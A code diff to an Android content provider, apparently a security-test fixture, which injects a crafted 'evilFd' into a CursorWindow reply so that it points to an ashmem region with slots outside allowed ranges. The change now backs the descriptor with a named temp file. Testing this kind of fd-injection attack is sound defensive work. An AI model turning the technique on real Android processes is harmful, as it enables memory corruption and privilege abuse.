@@ -28,6 +28,8 @@ import android.os.Parcel;
 import android.os.ParcelFileDescriptor;
 import android.util.Log;
 
+import java.io.File;
+
 /**
  * Content provider that uses a custom {@link CursorWindow} to inject file descriptor
  * pointing to another ashmem region having window slots with references outside of allowed ranges.
@@ -38,6 +40,14 @@ public class CursorWindowContentProvider extends ContentProvider {
     private static final String TAG = "CursorWindowContentProvider";
     static {
         System.loadLibrary("nativecursorwindow_jni");
+    }
+
+    private String mTempFilename;
+
+    @Override
+    public boolean onCreate() {
+        mTempFilename = (new File(getContext().getFilesDir(), "shared-file.dat")).getAbsolutePath();
+        return true;
     }
 
     @Override
@@ -85,7 +95,7 @@ public class CursorWindowContentProvider extends ContentProvider {
             }
             // Write reply with replaced file descriptor
             ParcelFileDescriptor evilFd = ParcelFileDescriptor
-                    .adoptFd(makeNativeCursorWindowFd(1000, 1000, true));
+                    .adoptFd(makeNativeCursorWindowFd(mTempFilename, 1000, 1000, true));
             dest.appendFrom(tmp, 0, fdPos);
             dest.writeFileDescriptor(evilFd.getFileDescriptor());
             tmp.setDataPosition(dest.dataPosition());
@@ -94,13 +104,10 @@ public class CursorWindowContentProvider extends ContentProvider {
         }
     }
 
-    private native static int makeNativeCursorWindowFd(int offset, int size, boolean isBlob);
+    private static native int makeNativeCursorWindowFd(String filename,
+            int offset, int size, boolean isBlob);
 
     // Stubs
-    @Override
-    public boolean onCreate() {
-        return true;
-    }
 
     @Override
     public int delete(Uri uri, String selection, String[] selectionArgs) {
